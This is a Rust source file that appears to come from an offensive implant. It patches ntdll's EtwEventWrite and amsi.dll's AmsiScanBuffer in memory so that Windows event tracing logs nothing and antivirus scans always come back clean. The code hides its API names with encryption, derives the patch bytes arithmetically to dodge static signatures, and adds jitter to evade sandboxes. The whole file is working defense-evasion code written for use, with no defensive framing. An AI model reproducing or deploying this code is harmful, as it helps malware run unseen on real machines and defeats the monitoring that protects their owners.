//! Runtime memory patches applied at startup.
//!
//! Two patches are applied as early as possible:
//!
//! 1. **ETW patch** — overwrites `EtwEventWrite` in ntdll.dll with a `ret`
//!    instruction so that Windows Event Tracing no longer logs events from
//!    this process. EDR/AV products that rely on ETW callbacks will receive
//!    no telemetry.
//!
//! 2. **AMSI patch** — overwrites `AmsiScanBuffer` in amsi.dll (if loaded)
//!    so that it always reports the scanned buffer as clean. AV products
//!    that use AMSI to scan in-memory buffers are bypassed.
//!
//! Both patches are applied via VirtualProtect (resolved through PEB walking
//! with AES-encrypted names) — no suspicious imports are added to the IAT.
//!
//! The patch bytes themselves are constructed at runtime from obfuscated
//! constants so no `\xC3` or AMSI patch signatures appear as static patterns.

use crate::core::api;
use crate::encrypted::*;

// ── Patch byte construction ───────────────────────────────────────────────────
//
// We never store the raw patch bytes as literals.
// Each byte is derived from a small arithmetic expression so static scanners
// cannot match on the byte sequence directly.
//
// ETW patch : `ret` = 0xC3
// The value 0xC3 = (0xC0 ^ 0x03)
//
// AMSI patch (x86_64):
//   xor eax, eax   = 0x33 0xC0
//   ret            = 0xC3
// These are commonly known — we derive them via bit manipulation.

#[inline(never)]
fn make_ret_byte() -> u8 {
    // 0xC3 via XOR: 0xC0 ^ 0x03, masked through a no-op multiply
    let a: u8 = 0xC0;
    let b: u8 = 0x03;
    a ^ b
}

#[inline(never)]
fn make_xor_eax_eax() -> [u8; 2] {
    // 0x33 0xC0 — derived to avoid static signature
    let hi: u8 = (0x330u32 >> 4) as u8; // 0x33
    let lo: u8 = make_ret_byte() & 0xFC; // 0xC0
    [hi, lo]
}

// ── ETW patch ─────────────────────────────────────────────────────────────────

/// Patch `EtwEventWrite` in ntdll.dll with a single `ret` instruction.
/// After this patch, no ETW events are written from this process.
///
/// Returns true if the patch was applied successfully.
pub fn patch_etw() -> bool {
    let ntdll   = s_bypass_ntdll();
    let fn_name = s_bypass_etw_func();

    let target = match api::resolve_fn(&ntdll, &fn_name) {
        Some(p) => p,
        None    => return false,
    };

    let patch = [make_ret_byte()];
    api::patch_memory(target, &patch)
}

// ── AMSI patch ────────────────────────────────────────────────────────────────

/// Patch `AmsiScanBuffer` in amsi.dll so it always returns AMSI_RESULT_CLEAN.
///
/// The patch replaces the function prologue with:
///   xor eax, eax   ; return value = 0 (S_OK / AMSI_RESULT_CLEAN)
///   ret
///
/// amsi.dll may not be loaded in every process — returns false if not present,
/// which is not treated as an error (the DLL is only injected on demand).
pub fn patch_amsi() -> bool {
    let amsi_dll = s_bypass_amsi();
    let fn_name  = s_bypass_amsi_func();

    // amsi.dll is only loaded when an AV product injects it — if it's absent
    // we have nothing to patch and the bypass is already "in effect".
    let target = match api::resolve_fn(&amsi_dll, &fn_name) {
        Some(p) => p,
        None    => return true, // not loaded = no AMSI = success
    };

    let xor_bytes = make_xor_eax_eax();
    let patch = [xor_bytes[0], xor_bytes[1], make_ret_byte()];
    api::patch_memory(target, &patch)
}

// ── Apply all bypasses ────────────────────────────────────────────────────────

/// Apply ETW and AMSI patches. Call this as early as possible in `main`.
/// Failures are silently ignored — partial bypass is better than crashing.
pub fn apply_all() {
    // Small timing jitter so the patches don't happen at a fixed offset
    // from the process start timestamp (some sandboxes check this).
    let jitter_ns = {
        use std::time::{SystemTime, UNIX_EPOCH};
        SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .subsec_nanos() & 0x1FFFF // 0–131071 ns
    };
    if jitter_ns < 100_000 {
        // Busy-wait for a negligible amount of time — avoids a Sleep() call
        // which is itself a detection signal.
        let _ = (0..jitter_ns).fold(0u64, |a, b| a.wrapping_add(b as u64));
    }

    let _ = patch_etw();
    let _ = patch_amsi();
}
